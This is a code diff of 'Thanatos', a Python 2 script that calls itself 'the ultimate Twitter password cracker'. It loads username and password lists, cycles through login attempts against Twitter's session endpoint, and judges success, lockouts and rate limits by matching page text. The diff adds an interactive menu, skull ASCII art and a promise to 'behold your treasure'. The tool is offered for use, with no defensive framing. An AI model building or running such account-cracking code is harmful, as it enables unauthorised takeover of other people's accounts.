@@ -1,30 +1,55 @@
 
-# Authenticate Query Unification Application
-# Wayne Kenney - 2015                                   
-#  _____                 ___     ___ 
-# |  _  |___ _ _ ___ ___|_  |   |   |
-# |     | . | | | .'|___|_| |_ _| | |
-# |__|__|_  |___|__,|   |_____|_|___|
-#         |_|                        
-# By LogicPy
+#    ___________.__                          __                                  
+#    \__    ___/|  |__ _____    ____ _____ _/  |_  ____  ______    ______ ___.__.
+#      |    |   |  |  \\__  \  /    \\__  \\   __\/  _ \/  ___/    \____ <   |  |
+#      |    |   |   Y  \/ __ \|   |  \/ __ \|  | (  <_> )___ \     |  |_> >___  |
+#      |____|   |___|  (____  /___|  (____  /__|  \____/____  > /\ |   __// ____|
+# 	                 \/     \/     \/     \/                \/  \/ |__|   \/     
 
-# Thanatos.py:
+# Coded by LogicPy, 2018
 
-#Modules
+# Modules
 import requests
 from random import randint
 import time
 from itertools import islice
 from tqdm import tqdm
+import sys
 
 def banner():
 	print """
+	                 uuuuuuu
+	             uu$$$$$$$$$$$uu
+	          uu$$$$$$$$$$$$$$$$$uu
+	         u$$$$$$$$$$$$$$$$$$$$$u
+	        u$$$$$$$$$$$$$$$$$$$$$$$u
+	       u$$$$$$$$$$$$$$$$$$$$$$$$$u
+	       u$$$$$$$$$$$$$$$$$$$$$$$$$u
+	       u$$$$$$     $$$     $$$$$$u
+	        $$$$       u$u       $$$$ 
+	        $$$u       u$u       u$$$
+	        $$$u      u$$$u      u$$$
+	          $$$$uu$$$   $$$uu$$$$ 
+	           $$$$$$$     $$$$$$$ 
+	            u$$$$$$$u$$$$$$$u
+	             u$ $ $ $ $ $ $u
+	  uuu        $$u$ $ $ $ $u$$       uuu
+	 u$$$$        $$$$$u$u$u$$$       u$$$$
+	  $$$$$uu       $$$$$$$$$      uu$$$$$$
+	u$$$$$$$$$$$uu             uuuu$$$$$$$$$$
+	$$$$   $$$$$$$$$$uuu   uu$$$$$$$$$   $$$ 
+	            $$$$$$$$$$$uu   $   
+	           uuuu   $$$$$$$$$$uuu
+	  u$$$uuu$$$$$$$$$uu   $$$$$$$$$$$uuu$$$
+	  $$$$$$$$$$                 $$$$$$$$$$$ 
+	    $$$$$                         $$$$  
+	     $$$                          $$$$ 
+
 	 _____ _               _                     
 	|_   _| |_ ___ ___ ___| |_ ___ ___   ___ _ _ 
 	  | | |   | .'|   | .'|  _| . |_ -|_| . | | |
 	  |_| |_|_|__,|_|_|__,|_| |___|___|_|  _|_  |
-	                                    |_| |___|                                                       
-	  - patience and discretion
+	                                    |_| |___|                                              
 """
 
 # Global Variables
@@ -33,10 +58,12 @@ pwd = 'a'
 inc = 0
 aPlace = 0
 bPlace = 3
+intBool = 0
 
-#Main Routine.
+# Main Routine.
 def main():
 
+	# Enable access to variables ANYWHERE
 	global USERNAME
 	global PASSWORD
 	global login_URL
@@ -51,24 +78,88 @@ def main():
 	import time
 	global uname
 	global pwd
+	global intBool
 
 	# Login URL
 	login_URL = 'https://twitter.com/sessions'
-	# POST redirection
+	# login_URL redirected to after login_URL containing keyword
 	landing = 'https://twitter.com/'
-	# keyword indicates successful login (1)
+	# The keyword that indicates successful login_URL detection
 	keyword = 'Verify your identity'
-	# keyword indicates successful login (2)
+	# Successful Login
 	keyword2 = 'Add emoji'
-	# keyword indicates successful login (3)
+	# Another Successful Login
 	keyword3 = 'Your account has been locked'
 	# Login Attempt Overload Indicator
 	keyword4 = 'Yikes! We need'
 	# Checkpoint - Broken username
 	keyword5 = 'We detected unusual'
 
-main()
-	
+	print "\n - [ Thanatos loaded ]\n"
+
+	while(intBool == 0):
+		cmd = raw_input("Command> ")
+		cmd = cmd.lower()
+		if cmd == "help":
+			print """
+  -----------------------------------------
+  ------------- Command List --------------
+  -----------------------------------------
+
+   help  - Display commands
+   start - Activate Thanatos
+   info  - Software information
+   exit  - Exit script
+
+  -----------------------------------------
+  -----------------------------------------
+			"""
+		elif cmd == "start":
+			intBool = 1
+			print "\n - [ Thanatos Activated ]\n"
+			processReq()
+		elif cmd == "info":
+			print """
+  -----------------------------------------
+  -------------- Information --------------
+  -----------------------------------------
+
+   Thanatos is the ultimate Twitter
+   password cracker. Simply populate
+   the username and password text files
+   and then activate the script...
+
+   Return later to behold your treasure.
+
+                     _.--.
+                 _.-'_:-'||
+             _.-'_.-::::'||
+        _.-:'_.-::::::'  ||
+      .'`-.-:::::::'     ||
+     /.'`;|:::::::'      ||_
+     ||   ||::::::'     _.;._'-._
+     ||   ||:::::'  _.-!oo @.!-._'-.
+     \'.  ||:::::.-!()oo @!()@.-'_.|
+     '.'-;|:.-'.&$@.& ()$%-'o.'\U||
+       `>'-.!@%()@'@_%-'_.-o _.|'||
+        ||-._'-.@.-'_.-' _.-o  |'||
+        ||=[ '-._.-\U/.-'    o |'||
+        || '-.]=|| |'|      o  |'||
+        ||      || |'|        _| ';
+        ||      || |'|    _.-'_.-'
+        |'-._   || |'|_.-'_.-'
+         '-._'-.|| |' `_.-'
+             '-.||_/.-'
+ 
+  -----------------------------------------
+  -----------------------------------------
+			"""
+		elif cmd == "exit":
+			intBool = 1
+			sys.exit()
+		else:
+			print "\n Invalid command provided - (Type 'help' for command list) \n"
+
 # Used for finding values between tags
 def find_between( s, first, last ):
     try:
@@ -83,6 +174,7 @@ def processReq():
 	global aPlace
 	global bPlace
 
+	# For usernames
 	text_file = open("list.txt", "r")
 
 	text_file2 = open("pw.txt", "r")
@@ -102,6 +194,7 @@ def processReq():
 				# Password cycle (Only first three words)
 				for p in PASSWORD[aPlace:bPlace]:
 				
+					# Print process
 					uname = u
 					pwd = p
 
@@ -176,4 +269,4 @@ def processReq():
 				time.sleep(1)
 
 banner()
-processReq()
+main()
